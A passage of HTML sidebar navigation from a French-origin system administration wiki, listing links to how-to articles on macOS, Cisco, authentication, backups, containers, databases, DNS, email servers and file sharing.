Misc</button><div class=sidebar-submenu><ul><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/Vider_son_cache_DNS_sur_Mac_OS_X/>Clearing DNS Cache on Mac OS X</a></li><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/Voir_les_fichiers_et_dossiers_cach%C3%A9s_sous_Mac_OS_X/>Viewing Hidden Files and Folders in Mac OS X</a></li><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/Cacher_une_application_ouverte_du_dock_et_du_switcher/>Hide an Open Application from the Dock and Switcher</a></li><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/MacFuse_%20_NTFS-3G_:_Lecture_et_%C3%A9criture_de_partitions_NTFS_sur_Mac_OS_X/>MacFuse + NTFS-3G: Reading and Writing NTFS Partitions on Mac OS X</a></li><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/Installer_OSX_depuis_un_disque_externe/>Installing OSX from an External Drive</a></li><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/switch_mac_os_case_sensitive/>Switching to Case-Sensitive File System on Mac OS X</a></li></ul></div></li></ul></div></li><li class="sidebar-dropdown current active"><button class=btn>
<i class="material-icons me-2">dns</i>
Misc</button><div class="sidebar-submenu d-block"><ul><li class="sidebar-dropdown nested"><button class=btn>
Fonera</button><div class=sidebar-submenu><ul><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/Modifier_le_firmware_par_le_OpenWrt/>Modifying the firmware with OpenWrt</a></li><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/activer-le-ssh-sur-sa-fonera-plus/>Enabling SSH on the Fonera+</a></li><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/Modifier_le_firmware_par_le_FrancoFON/>Modify the firmware with FrancoFON</a></li></ul></div></li><li class="sidebar-dropdown nested"><button class=btn>
Google</button><div class=sidebar-submenu><ul><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/Gmail_:_Avoir_plusieurs_adresses_mails_avec_un_seul_compte_gmail/>Gmail: Having Multiple Email Addresses with a Single Gmail Account</a></li><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/Google_Astuces_de_recherche/>Google Search Tips</a></li></ul></div></li><li class="sidebar-dropdown nested"><button class=btn>
LaTeX</button><div class=sidebar-submenu><ul><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/Beamer_:_create_beautiful_LaTeX_presentations/>Beamer: Create Beautiful LaTeX Presentations</a></li><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/Template_pour_cr%C3%A9er_des_Cheat_Sheet_en_LaTeX/>LaTeX Template for Creating Cheat Sheets</a></li></ul></div></li><li class="sidebar-dropdown nested current active"><button class=btn>
Misc</button><div class="sidebar-submenu d-block"><ul><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/OpenElec_:_Solution_multimedia_pour_Raspberry_Pi/>OpenElec: Multimedia Solution for Raspberry Pi</a></li><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/R%C3%A9parer_une_video_d%27une_GoPro_Hero/>Repairing a GoPro Hero Video</a></li><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/Rebooter_sa_Freebox_Server_6_en_ligne_de_commande/>Reboot Your Freebox Server 6 via Command Line</a></li><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/Signification_des_bips_%C3%A9mis_par_le_Bios/>BIOS Beep Codes and Their Meanings</a></li></ul></div></li><li class="sidebar-dropdown nested"><button class=btn>
Soekris</button><div class=sidebar-submenu><ul><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/Installer_pfSense_sur_Soekris/>Installing pfSense on Soekris</a></li><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/Upgrader_le_BIOS_de_la_Soekris/>Upgrading the Soekris BIOS</a></li><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/Configuration_et_installation_via_port_s%C3%A9rie_d%27OpenBSD_sur_Soekris/>OpenBSD Configuration and Installation via Serial Port on Soekris</a></li></ul></div></li></ul></div></li><li class=sidebar-dropdown><button class=btn>
<i class="material-icons me-2">dns</i>
Network</button><div class=sidebar-submenu><ul><li class="sidebar-dropdown nested"><button class=btn>
Cisco</button><div class=sidebar-submenu><ul><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/analyser-les-configs-des-equipements-et-des-reseaux/>Analyzing Network Equipment and Network Configurations</a></li><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/Configuration_d%27un_Switch_Catalyst/>Configuring a Catalyst Switch</a></li><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/Dumper_les_connections_dune_interface/>Capturing connections on an interface</a></li><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/Installation_from_Scratch_d%27un_Cisco_Pix/>Installation from Scratch of a Cisco Pix</a></li><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/Resetter_completement_la_configuration_d%27un_Cisco/>Completely Reset a Cisco Configuration</a></li><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/Configuration_de_base_d%27un_Cisco_Pix/>Basic Configuration of a Cisco PIX</a></li></ul></div></li><li class="sidebar-dropdown nested"><button class=btn>
Theory</button><div class=sidebar-submenu><ul><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/Protocole_BGP_et_sa_s%C3%A9curit%C3%A9/>BGP Protocol and its Security</a></li><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/Les_flux_r%C3%A9seaux/>Network Flows</a></li><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/Les_Flags_TCP/>TCP Flags</a></li></ul></div></li></ul></div></li><li class=sidebar-dropdown><button class=btn>
<i class="material-icons me-2">host</i>
Servers</button><div class=sidebar-submenu><ul><li class="sidebar-dropdown nested"><button class=btn>
Authentication</button><div class=sidebar-submenu><ul><li class="sidebar-dropdown nested"><button class=btn>
FreeRadius</button><div class=sidebar-submenu><ul><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/Mise_en_place_d%27un_serveur_FreeRadius/>Setting up a FreeRadius server</a></li></ul></div></li><li class="sidebar-dropdown nested"><button class=btn>
Kerberos</button><div class=sidebar-submenu><ul><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/Authentification_SSO_depuis_Apache_sur_backend_AD_via_Kerberos/>Apache SSO Authentication on AD Backend via Kerberos</a></li><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/Kerberos_:_Mise_en_place_d%27un_serveur_Kerberos/>Kerberos: Setting up a Kerberos Server</a></li><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/Authentification_de_comptes_Solaris_sur_un_Active_Directory/>Authenticating Solaris Accounts on Active Directory</a></li></ul></div></li><li class="sidebar-dropdown nested"><button class=btn>
OpenLDAP</button><div class=sidebar-submenu><ul><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/LDAP_:_Installation_et_configuration_d%27un_Annuaire_LDAP/>LDAP: Installation and Configuration of an LDAP Directory</a></li><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/Mise_en_place_d%27une_solution_de_Syncronisation_entre_ActiveDirectory_et_OpenLDAP/>Setting up a Synchronization Solution between ActiveDirectory and OpenLDAP</a></li><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/PhpLDAPadmin:_Mise_en_place_d%27une_solution_de_management_graphique_pour_OpenLDAP/>PhpLDAPadmin: Setting Up a Graphical Management Solution for OpenLDAP</a></li><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/LDAP_:_Installation_et_configuration_d%27un_Annuaire_LDAP_%28secondaire%29/>LDAP: Installation and Configuration of a Secondary LDAP Directory</a></li></ul></div></li><li class="sidebar-dropdown nested"><button class=btn>
PAM</button><div class=sidebar-submenu><ul><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/Pam_time:_Mettre_des_restrictions_sur_les_logins/>PAM Time: Setting Login Restrictions</a></li><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/Pam_cracklib_:_Choisir_la_complexit%C3%A9_des_mots_de_passe/>PAM Cracklib: Configure Password Complexity</a></li><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/PAM-script_:_Executer_des_scripts_%C3%A0_l%27authentification,_l%27ouverture_et_la_fermeture_de_session/>PAM-script: Execute Scripts at Authentication, Session Open and Close</a></li><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/PAM_:_Installer_pam_mkhomedir_pour_la_cr%C3%A9ation_automatique_des_home_utilisateurs/>PAM: Install pam_mkhomedir for Automatic User Home Directory Creation</a></li><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/PAM_mount:_Monter_des_partages_r%C3%A9seaux_au_login/>PAM mount: Automatically Mount Network Shares at Login</a></li><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/PAM_%28Pluggable_Authentification_Module%29_:_Choisir_ses_m%C3%A9thodes_d%27authentifications/>PAM (Pluggable Authentication Module): Choosing Authentication Methods</a></li><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/PAM_Mount_et_SshFS_avec_authentification_par_mot_de_passe/>PAM Mount and SshFS with Password Authentication</a></li></ul></div></li><li class="sidebar-dropdown nested"><button class=btn>
Radius</button><div class=sidebar-submenu><ul><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/Daloradius_:_Mise_en_place_d%27un_serveur_FreeRadius_avec_interface_web_Daloradius/>DaloRADIUS: Setting up a FreeRadius server with DaloRADIUS web interface</a></li></ul></div></li><li class="sidebar-dropdown nested"><button class=btn>
SSO</button><div class=sidebar-submenu><ul><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/LemonLDAP::NG_:_Plus_qu%27un_simple_SSO/>LemonLDAP::NG: More than just SSO</a></li><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/OpenID_:_Centralisation_d%27authentification/>OpenID: Authentication Centralization</a></li><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/CAS_:_Mise_en_place_d%27un_serveur_SSO/>CAS: Setting Up an SSO Server</a></li></ul></div></li></ul></div></li><li class="sidebar-dropdown nested"><button class=btn>
Backups</button><div class=sidebar-submenu><ul><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/Rsync_:_Sauvegarde_incr%C3%A9mentale/>Rsync: Incremental Backup</a></li><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/BackupPC_:_Un_outil_complet_de_backup/>BackupPC: A Complete Backup Tool</a></li><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/Unison_:_Sauvegarde_comme_rsync_mais_bidirectionnelle/>Unison: Backup like rsync but bidirectional</a></li><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/amazone-s3-sauvegarde-propres-et-automatisees-avec-amazon-s3/>Amazon S3: Clean and Automated Backups with Amazon S3</a></li><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/Bacula_:_Mise_en_place_d%27un_serveur_de_Backup_Performant/>Bacula: Setting Up a High-Performance Backup Server</a></li><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/ZRM_:_Sauvegardes_automatis%C3%A9es_et_restaurations_faciles/>ZRM: Automated Backups and Easy Restorations</a></li><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/Sauvegardes_et_Restaurations/>Backups and Restorations with tapes</a></li><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/Rdiff-backup_:_Sauvegardes_distantes_incr%C3%A9mentielles/>Rdiff-backup: Incremental Remote Backups</a></li></ul></div></li><li class="sidebar-dropdown nested"><button class=btn>
Cloud computing</button><div class=sidebar-submenu><ul><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/DevStack_:_d%C3%A9velopper_ou_tester_rapidement_OpenStack/>DevStack: Quickly Develop or Test OpenStack</a></li><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/OwnCloud_:_cr%C3%A9er_son_cloud_personnel/>OwnCloud: Create Your Personal Cloud</a></li></ul></div></li><li class="sidebar-dropdown nested"><button class=btn>
Configuration Managers</button><div class=sidebar-submenu><ul><li class="sidebar-dropdown nested"><button class=btn>
Puppet</button><div class=sidebar-submenu><ul><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/PuppetDB_:_Augmentez_les_fonctionnalit%C3%A9s_de_votre_Puppet/>PuppetDB: Enhance Your Puppet Functionality</a></li><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/Puppet%C2%A0:%C2%A0Solution_de_gestion_de_fichier_de_configuration/>Puppet: Configuration File Management Solution</a></li><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/MCollective:_lancez_des_actions_en_parall%C3%A8le_sur_des_machines_distante/>MCollective: Run Actions in Parallel on Remote Machines</a></li><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/Puppet_Dashboard_:_Mise_en_place_d%27une_interface_graphique_pour_Puppet/>Puppet Dashboard: Setting up a Graphical Interface for Puppet</a></li></ul></div></li><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/ansible-a-powerful-agentless-configuration-management-and-orchestrator-solution/>Ansible: A Powerful Agentless Configuration Management and Orchestrator Solution</a></li></ul></div></li><li class="sidebar-dropdown nested"><button class=btn>
Containers</button><div class=sidebar-submenu><ul><li class="sidebar-dropdown nested"><button class=btn>
OpenVZ</button><div class=sidebar-submenu><ul><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/OpenVZ_:_Mise_en_place_d%27OpenVZ/>OpenVZ: Setting Up OpenVZ</a></li><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/WebVZ%5C_:_Administrer_ces_VM_OpenVZ_en_interface_web/>WebVZ: Manage OpenVZ VMs with a Web Interface</a></li></ul></div></li><li class="sidebar-dropdown nested"><button class=btn>
Solaris Zones</button><div class=sidebar-submenu><ul><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/Configuration_et_utilisation_des_Zones_Solaris_%28Containers%29/>Configuration and Usage of Solaris Zones (Containers)</a></li><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/Installation_de_Zones_HA_avec_ZFS_et_Solaris_Cluster/>Installing HA Zones with ZFS and Solaris Cluster</a></li></ul></div></li><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/LXC_:_Install_and_configure_the_Linux_Containers/>LXC: Install and configure the Linux Containers</a></li><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/Docker_:_manage_LXC_containers_easily_with_advanced_features/>Docker: Manage Containers Easily with Advanced Features</a></li><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/VServer_:_Mise_en_place_de_VServer/>VServer: Setting Up VServer</a></li></ul></div></li><li class="sidebar-dropdown nested"><button class=btn>
Databases</button><div class=sidebar-submenu><ul><li class="sidebar-dropdown nested"><button class=btn>
MySQL/MariaDB</button><div class=sidebar-submenu><ul><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/MariaDB_Galera_Cluster_:_la_r%C3%A9plication_multi_maitres/>MariaDB Galera Cluster: Multi-Master Replication</a></li><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/MySQL_:_Installation_et_configuration/>MySQL: Installation and Configuration</a></li><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/MariaDB_:_Migration_depuis_MySQL/>MariaDB: Migration from MySQL</a></li><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/Xtrabackup_:_Optimiser_ses_backups_MySQL/>XtraBackup: Optimizing Your MySQL Backups</a></li><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/Sauvegardes,_restaurations_et_transferts/>MySQL: Backups, Restorations and Transfers</a></li><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/Replication_Master_to_Master/>Replication Master to Master</a></li><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/MysqlTuner_:_Optimiser_votre_serveur_MySQL/>MysqlTuner: Optimizing Your MySQL Server</a></li><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/Utilisation_de_MySQL/>Using MySQL</a></li><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/Purger_les_mysql-bin_logs/>Purging MySQL Binary Logs</a></li><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/Lancer_plusieurs_instances_de_MySQL_sur_Solaris/>Running Multiple MySQL Instances on Solaris</a></li><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/PhpMyAdmin_:_Installation_et_configuration/>PhpMyAdmin: Installation and Configuration</a></li><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/GreenSQL:_Eviter_les_injections_SQL_avec_GreenSQL/>GreenSQL: Preventing SQL Injections with GreenSQL</a></li><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/R%C3%A9parer_des_bases_MyISAM_et_InnoDB/>Repairing MyISAM and InnoDB Databases</a></li><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/Mise_en_place_d%27un_Proxy_MySQL/>Setting up a MySQL Proxy</a></li><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/MySQL_Cluster_Load_Balanc%C3%A9_avec_Heartbeat/>MySQL Cluster Load Balanced with Heartbeat</a></li><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/Replication_Master_to_Slave/>MySQL Replication Master to Slave</a></li></ul></div></li><li class="sidebar-dropdown nested"><button class=btn>
NoSQL</button><div class=sidebar-submenu><ul><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/ElasticSearch:_powerful_search_and_analytics_engine/>ElasticSearch: Powerful Search and Analytics Engine</a></li></ul></div></li><li class="sidebar-dropdown nested"><button class=btn>
PostgreSQL</button><div class=sidebar-submenu><ul><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/Installation_et_configuration_de_PostgreSQL/>PostgreSQL Installation and Configuration</a></li><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/Slony-I_:_R%C3%A9plication_de_bases_pour_PostgresSQL/>Slony-I: Database Replication for PostgreSQL</a></li><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/PhpPgAdmin_:_Installation_et_configuration/>PhpPgAdmin: Installation and Configuration</a></li></ul></div></li><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/Sybase_:_installation_et_configuration/>Sybase: Installation and Configuration</a></li></ul></div></li><li class="sidebar-dropdown nested"><button class=btn>
DNS</button><div class=sidebar-submenu><ul><li class="sidebar-dropdown nested"><button class=btn>
Bind</button><div class=sidebar-submenu><ul><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/Utilisation_avanc%C3%A9_de_Bind/>Advanced usage of Bind</a></li><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/Installation_et_configuration_d%27un_serveur_Bind9_primaire_%28Master%29/>Installing and Configuring a Primary Bind9 Server (Master)</a></li><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/NamedManager_:_une_interface_web_agr%C3%A9able_pour_administrer_Bind/>NamedManager: A Nice Web Interface to Manage Bind</a></li><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/Bindgraph_:_Avoir_des_stats_et_des_graphs_des_requ%C3%AAtes_DNS/>Bindgraph: Get Statistics and Graphs of DNS Queries</a></li><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/Securing_a_Bind_architecture/>Securing a Bind Architecture</a></li><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/Installation_et_configuration_d%27un_serveur_Bind9_secondaire_%28Slave%29/>Installation and Configuration of a Bind9 Secondary (Slave) Server</a></li><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/Mise_en_place_d%27un_serveur_Bind_en_backend_LDAP/>Setting up a Bind server with LDAP backend</a></li></ul></div></li><li class="sidebar-dropdown nested"><button class=btn>
PowerDNS</button><div class=sidebar-submenu><ul><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/PowerAdmin_:_Une_interface_d%27administration_pour_PowerDNS/>PowerAdmin: An Administration Interface for PowerDNS</a></li><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/PowerDNS:_Cr%C3%A9er_un_serveur_de_cache_DNS/>PowerDNS: Creating a DNS Cache Server</a></li><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/PowerDNS_:_Cr%C3%A9er_serveur_DNS_maitre/>PowerDNS: Creating a Master DNS Server</a></li></ul></div></li><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/Unbound_:_Mise_en_place_d%27un_serveur_DNS_nouvelle_g%C3%A9n%C3%A9ration/>Unbound: Implementing a Next Generation DNS Server</a></li></ul></div></li><li class="sidebar-dropdown nested"><button class=btn>
eMails</button><div class=sidebar-submenu><ul><li class="sidebar-dropdown nested"><button class=btn>
Exchange</button><div class=sidebar-submenu><ul><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/Exchange_:_R%C3%A9parer_et_d%C3%A9fragmenter_les_bases_de_donn%C3%A9es/>Exchange: Repairing and Defragmenting Databases</a></li></ul></div></li><li class="sidebar-dropdown nested"><button class=btn>
Postfix</button><div class=sidebar-submenu><ul><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/Postfix:_limit_outgoing_mail_throttling/>Postfix: Limit Outgoing Mail Throttling</a></li><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/Postfix:_hold_outgoing_mail_transport/>Postfix: hold outgoing mail transport</a></li><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/Installation_et_configuration_de_Postfix_et_Courrier/>Installation and Configuration of Postfix and Courier</a></li><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/Simulate_a_black_hole_for_a_domain_with_Postfix/>Simulate a black hole for a domain with Postfix</a></li><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/Lancement_d%27une_commande_%C3%A0_la_r%C3%A9ception_d%27un_mail/>Running a Command When Receiving an Email</a></li><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/SASL_:_Envoie_de_mails_%C3%A0_distance_s%C3%A9curis%C3%A9_avec_son_serveur_Postfix_%28SASL%20TLS%29/>SASL: Secure Remote Email Sending with Postfix Server (SASL+TLS)</a></li><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/R%C3%A9glage_de_probl%C3%A8mes/>Troubleshooting mails with Postfix</a></li><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/Domaines_Virtuels/>Virtual Domains</a></li><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/Mise_en_place_d%27un_Antivirus_%28ClamAV_et_Amavis%29/>Setting up an Antivirus (ClamAV and Amavis)</a></li><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/MX_Secondaire:_mise_en_place/>Secondary MX: Setup</a></li><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/Dkfilter_:_Proxy_SMTP_%28signatures_mails%29_made_by_Yahoo/>Dkfilter: Proxy SMTP (Signature Mails) Made by Yahoo</a></li><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/Postsuper_:_Suppression_massive_de_mails_dans_la_queue/>Postsuper: Mass Deletion of Emails in the Queue</a></li><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/SSL_:_Gestion_des_certificats/>SSL: Certificate Management</a></li><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/Swaks_-_Swiss_Army_Knife_SMTP/>Swaks - Swiss Army Knife SMTP</a></li></ul></div></li><li class="sidebar-dropdown nested"><button class=btn>
Spamassassin</button><div class=sidebar-submenu><ul><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/Installation_et_configuration_de_SpamAssassin/>SpamAssassin Installation and Configuration</a></li><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/FuzzyOcr_Plugin_:_D%C3%A9tection_des_spams_image_%28OCR_Detection%29/>FuzzyOcr Plugin: Image Spam Detection (OCR Detection)</a></li><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/Lutter_un_peu_plus_contre_le_SPAM_-_R%C3%A8gles_suppl%C3%A9mentaires/>Fight Spam More Effectively - Additional Rules</a></li><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/R%C3%A9injection_de_Spams_pour_tests/>Spam Reinjection for Testing</a></li></ul></div></li><li class="sidebar-dropdown nested"><button class=btn>
SPF</button><div class=sidebar-submenu><ul><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/OpenSPF:_Mise_en_place_d%27OpenSPF/>OpenSPF: Setting up OpenSPF</a></li><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/SPF_%28Sender_Policy_Framework%29_:_Pr%C3%A9vention_de_la_contrefa%C3%A7on_d%27adresses_mails/>SPF (Sender Policy Framework): Prevention of Email Address Forgery</a></li></ul></div></li><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/Getmail_-_L%27alternative_%C3%A0_Fetchmail/>Getmail - An Alternative to Fetchmail</a></li><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/Z-Push_:_Avoir_un_serveur_ActiveSync_avec_Postfix_%28ou_comment_faire_du_push_mail%29/>Z-Push: Setting Up an ActiveSync Server with Postfix (or How to Set Up Push Mail)</a></li><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/Mise_en_place_d%27un_serveur_antispam_complet/>Setting up a complete antispam server</a></li><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/Mise_en_place_d%27un_serveur_Courier_POP3_avec_SSL/>Setting up a Courier POP3 server with SSL</a></li><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/Squirrelmail_:_Mise_en_place_d%27un_webmail_simple_mais_%C3%A9volu%C3%A9/>SquirrelMail: Setting up a Simple yet Advanced Webmail</a></li><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/altermime-ajouter-automatiquement-un-disclamer-sur-les-emails-sortants/>AlterMIME: Automatically Add a Disclaimer to Outgoing Emails</a></li><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/fetchmail-the-ultimate-mail-collector/>Fetchmail - The Ultimate Mail Collector</a></li><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/Procmail_:_Filtrer_ses_mails_%C3%A0_la_source/>Procmail: Filtering emails at the source</a></li><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/Postgrey_:_Mise_en_place_de_greylists_pour_lutter_contre_le_spam/>Postgrey: Setting Up Greylists to Fight Spam</a></li><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/Synchronisation_de_boites_mails_IMAP/>IMAP Mailbox Synchronization</a></li></ul></div></li><li class="sidebar-dropdown nested"><button class=btn>
File sharing</button><div class=sidebar-submenu><ul><li class="sidebar-dropdown nested"><button class=btn>
iSCSI</button><div class=sidebar-submenu><ul><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/ISCSI_:_Mise_en_place_d%27un_serveur_iSCSI/>iSCSI: Setting up an iSCSI Server</a></li><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/Cr%C3%A9er_un_partage_iSCSI_entre_Solaris_et_Debian/>Creating an iSCSI Share Between Solaris and Debian</a></li></ul></div></li><li class="sidebar-dropdown nested"><button class=btn>
Samba</button><div class=sidebar-submenu><ul><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/Installation_et_configuration_de_Samba_en_mode_Contr%C3%B4leur_de_domaine/>Installing and configuring Samba as a Domain Controller</a></li><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/trick-samba-share-size-display/>Trick Samba Share Size Display</a></li><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/Installation_et_configuration_de_Samba_en_mode_%22User%22/>Installation and Configuration of Samba in 'User' Mode</a></li><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/problemes_d%5C%27enregistrements_de_fichiers_de_type_office,_adobe...>Problems with saving Office, Adobe... file types</a></li><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/Monter_un_partage_Windows_depuis_Samba/>Mounting a Windows Share from Samba</a></li><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/Installation_et_configuration_de_Samba_en_mode_%22User%22_%28Authentification_sur_un_serveur_OpenLDAP%29/>Installation and Configuration of Samba in User Mode (Authentication on an OpenLDAP Server)</a></li><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/Installation_et_configuration_de_Samba_en_mode_%22ADS%22_%28Authentification_sur_un_serveur_AD%29/>Installation and Configuration of Samba in ADS Mode (Authentication on an AD Server)</a></li><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/Installation_et_configuration_de_Samba_en_mode_%22Share%22/>Installation and Configuration of Samba in "Share" Mode</a></li><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/Corbeille_r%C3%A9seau/>Network Recycle Bin</a></li></ul></div></li><li class="sidebar-dropdown nested"><button class=btn>
SFTP & FTP</button><div class=sidebar-submenu><ul><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/SSLH:_Multiplexer_les_connections_SSL_et_SSH_sur_le_m%C3%AAme_port/>SSLH: Multiplexing SSL and SSH connections on the same port</a></li><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/Vsftpd_:_Mise_en_place_d%27h%C3%B4tes_virtuels_avec_MySQL/>Vsftpd: Setting up virtual hosts with MySQL</a></li><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/MySecureShell%C2%A0:%C2%A0Mise_en_place_d%27une_solution_s%C3%A9curis%C3%A9e_de_transfert_de_fichiers/>MySecureShell: Setting up a Secure File Transfer Solution</a></li><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/Phpftpwho_:_Monitoring_de_connections_pour_Proftpd/>PhpFtpWho: Connection Monitoring for Proftpd</a></li></ul></div></li><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/NFS_:_Mise_en_place_d%27un_serveur_NFS/>NFS: Setting up an NFS Server</a></li><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/aoe-mise-en-place-d-un-serveur-ata-over-ethernet/>AOE: Setting Up an ATA Over Ethernet Server</a></li><li><a class=sidebar-nested-link href=https://wiki.deimos.fr/Mise_en_place_d%27un_serveur_de_Home_sp%C3%A9cialis%C3%A9_syst%C3%A8mes_Unix/>Setting up a Unix systems specialized Home server</a></li><li><a class=sidebar-nested-link 